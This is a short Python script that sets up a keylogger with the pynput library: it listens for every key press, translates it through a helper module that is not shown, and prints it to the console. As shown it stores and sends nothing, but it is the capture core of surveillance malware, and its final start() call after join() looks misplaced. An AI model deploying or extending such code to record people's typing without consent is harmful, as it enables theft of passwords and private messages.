#!/bin/python3.10

from helpKey import translateKey
from pynput.keyboard import Key, Listener


def printDataConsole(key):
    if key != '':
        print('{0}'.format(key))


def recordKey(key):
    # We translate the Keys
    key = translateKey(key)

    # We print the keys
    printDataConsole(key)


def initKeylogger():
    with Listener(on_press=recordKey) as listener:
        listener.join()
        listener.start()
